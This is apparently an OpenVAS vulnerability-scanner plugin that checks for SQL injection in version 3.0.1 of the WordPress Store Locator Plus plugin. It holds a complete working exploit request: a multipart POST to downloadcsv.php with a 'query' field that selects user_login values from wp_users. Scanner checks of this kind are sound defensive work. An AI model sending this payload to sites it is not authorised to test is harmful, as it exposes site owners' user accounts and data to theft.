##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_store_locator_plus_mult_vuln.nasl 3566 2016-06-21 07:31:36Z benallard $
#
# WordPress Google Maps Via Store Locator Plus Plugin Multiple Vulnerabilities
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow attacker to obtain sensitive
  information, compromise the application, access or modify data, exploit
  latent vulnerabilities in the underlying database.
  Impact Level: System/Application";
tag_affected = "WordPress Google Maps Via Store Locator Plus Plugin version 3.0.1";
tag_insight = "- An error exists due to the application displaying the installation path in
    debug output when accessing wp-content/plugins/store-locator-le/core/load_
    wp_config.php.
  - Input passed via the 'query' parameter to /wp-content/plugins/store-
    locator-le/downloadcsv.php is not properly sanitised before being used
    in a SQL query. This can be exploited to manipulate SQL queries by
    injecting arbitrary SQL code.";
tag_solution = "Upgrade to Google Maps Via Store Locator Plus Plugin version 3.0.5 or later,
  For updates refer to http://wordpress.org/extend/plugins/store-locator-le";
tag_summary = "This host is running WordPress Google Maps Via Store Locator Plus
  Plugin and is prone to multiple vulnerabilities.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.802644";
CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 3566 $");
  script_bugtraq_id(53795);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2016-06-21 09:31:36 +0200 (Tue, 21 Jun 2016) $");
  script_tag(name:"creation_date", value:"2012-06-21 12:12:12 +0530 (Thu, 21 Jun 2012)");
  script_name("WordPress Google Maps Via Store Locator Plus Plugin Multiple Vulnerabilities");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/49391");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/76094");
  script_xref(name : "URL" , value : "http://wordpress.org/extend/plugins/store-locator-le/changelog/");

  script_summary("Check if Store Locator Plus Plugin is vulnerable to SQL injection");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("wordpress/installed");
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  exit(0);
}


include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");
include("host_details.inc");


## Variable Initialization
req = "";
res = "";
port = 0;

## Get HTTP Port
if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);

## Check Port State
if(! get_port_state(port)){
  exit(0);
}

## Check Host Supports PHP
if(! can_host_php(port: port)){
  exit(0);
}

## Get WordPress Installed Location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port))exit(0);

## Construct attack request
url = dir + "/wp-content/plugins/store-locator-le/downloadcsv.php";

req = string(
       "POST ", url, " HTTP/1.1\r\n",
       "Host: ", get_host_name(), "\r\n",
       "Content-Type: multipart/form-data; boundary=----------------------------7e0b3991dc3a\r\n",
       "Content-Length: 223\r\n\r\n",
       "------------------------------7e0b3991dc3a\r\n",
       'Content-Disposition: form-data; name="query"',"\r\n",
       "\r\n",
       "SELECT concat(0x4f70656e564153,0x3a,user_login,0x3a,0x4f70656e564153) FROM wp_users\r\n",
       "------------------------------7e0b3991dc3a--\r\n\r\n" );

## Try SQL injection Attack
res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

## Confirm exploit worked by checking the response
if(res && res =~ "OpenVAS:(.+):OpenVAS"){
  security_message(port);
}
